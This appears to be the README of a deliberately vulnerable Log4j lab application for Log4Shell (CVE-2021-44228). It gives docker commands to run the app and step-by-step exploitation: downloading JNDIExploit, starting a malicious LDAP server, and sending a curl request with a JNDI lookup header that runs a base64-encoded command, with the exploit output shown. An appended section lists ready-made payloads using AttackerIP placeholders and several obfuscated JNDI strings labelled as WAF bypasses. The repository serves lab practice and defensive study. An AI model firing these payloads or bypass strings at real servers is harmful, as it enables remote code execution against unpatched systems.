# Log4Shell sample vulnerable application (CVE-2021-44228)

This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).

It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_181.

![](./screenshot.png)

## Running the application

Run it:

```bash
docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```

Build it yourself (you don't need any Java-related tooling):

```bash
docker build . -t vulnerable-app
docker run -p 8080:8080 --name vulnerable-app vulnerable-app
```

## Exploitation steps

*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*

**Update (Dec 13th)**: *The JNDIExploit repository has been removed from GitHub (presumably, [not by GitHub](https://twitter.com/_mph4/status/1470343429599211528)). Just append `web.archive.org` in front of the JNDIExploit download URL below to use the version cached by the Wayback Machine.*

* Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server

```bash
wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
```

* Then, trigger the exploit using:

```bash
# will execute 'touch /tmp/pwned'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

* Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:

```
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
[+] Paylaod: command
[+] Command: touch /tmp/pwned

[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
[+] Receive ClassRequest: Exploitjkk87OnvOH.class
[+] Response Code: 200
```

* To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in the container running the vulnerable application:

```
$ docker exec vulnerable-app ls /tmp
...
pwned
...
```

## Reference

https://www.lunasec.io/docs/blog/log4j-zero-day/
https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/

## Contributors

[@christophetd](https://twitter.com/christophetd)
[@rayhan0x01](https://twitter.com/rayhan0x01)

## JNDI-Exploit-1.2-log4shell
 Details : CVE-2021-44228

Usage :  

```
-----------------------------------------------------

java -jar JNDIExploit-1.2.jar -i AttackerIP

  * -i, --ip       Local ip address
    -l, --ldapPort Ldap bind port (default: 1389)
    -p, --httpPort Http bind port (default: 8080)
    -u, --usage    Show usage (default: false)
    -h, --help     Show this help

-----------------------------------------------------

```
Basic Payloads :

```
curl VictimIP/Domain -H 'X-Api-Version: ${jndi:ldap://AttackerIP:LDAP_PORT/}'

curl VictimIP/Domain -H 'User-Agent: ${jndi:ldap://AttackerIP:LDAP_PORT/Basic/Command/Base64/[base64_encoded_cmd]}
```
WAF bypass :
```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://AttackerIP:LDAP_PORT/Basic/Command/Base64/[base64_encoded_cmd]}

${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//URL.com/a}

${j${lower:n}d${lower:i}${lower::}${lower:l}d${lower:a}p${lower::}${lower:/}/${lower:1}${lower:2}${lower:7}.${lower:0}${lower:.}${lower:0}${lower:.}${lower:1}${lower::}${lower:1}0${lower:9}${lower:9}/${lower:o}${lower:b}j}
 
${${upper:j}${lower:n}${lower:d}${lower:i}${lower::}${lower:l}${lower:d}${lower:a}${lower:p}${lower::}${lower:/}${lower:/}${lower:1}${lower:2}${lower:7}${lower:.}${lower:0}${lower:.}${lower:0}${lower:.}${lower:1}${lower::}${lower:1}${lower:0}${lower:9}${lower:9}${lower:/}${lower:o}${lower:b}${lower:j}}
 
${${nuDV:CW:yqL:dWTUHX:-j}n${obpOW:C:-d}${ll:-i}:${GI:-l}d${YRYWp:yjkg:wrsb:RajYR:-a}p://${RHe:-1}2${Qmox:dC:MB:-7}${ucP:yQH:xYtT:WCVX:-.}0.${WQRvpR:ligza:J:DSBUAv:-0}.${v:-1}:${p:KJ:-1}${Ek:gyx:klkQMP:-0}${UqY:cE:LPJtt:L:ntC:-9}${NR:LXqcg:-9}/o${fzg:rsHKT:-b}j}
 
${${uPBeLd:JghU:kyH:C:TURit:-j}${odX:t:STGD:UaqOvq:wANmU:-n}${mgSejH:tpr:zWlb:-d}${ohw:Yyz:OuptUo:gTKe:BFxGG:-i}${fGX:L:KhSyJ:-:}${E:o:wsyhug:LGVMcx:-l}${Prz:-d}${d:PeH:OmFo:GId:-a}${NLsTHo:-p}${uwF:eszIV:QSvP:-:}${JF:l:U:-/}${AyEC:rOLocm:-/}${jkJFS:r:xYzF:Frpi:he:-1}${PWtKH:w:uMiHM:vxI:-2}${a:-7}${sKiDNh:ilypjq:zemKm:-.}${QYpbY:P:dkXtCk:-0}${Iwv:TmFtBR:f:PJ:-.}${Q:-0}${LX:fMVyGy:-.}${lS:Mged:X:th:Yarx:-1}${xxOTJ:-:}${JIUlWM:-1}${Mt:Wxhdp:Rr:LuAa:QLUpW:-0}${sa:kTPw:UnP:-9}${HuDQED:-9}${modEYg:UeKXl:YJAt:pAl:u:-/}${BPJYbu:miTDQJ:-o}${VLeIR:VMYlY:f:Gaso:cVApg:-b}${sywJIr:RbbDTB:JXYr:ePKz:-j}}

```
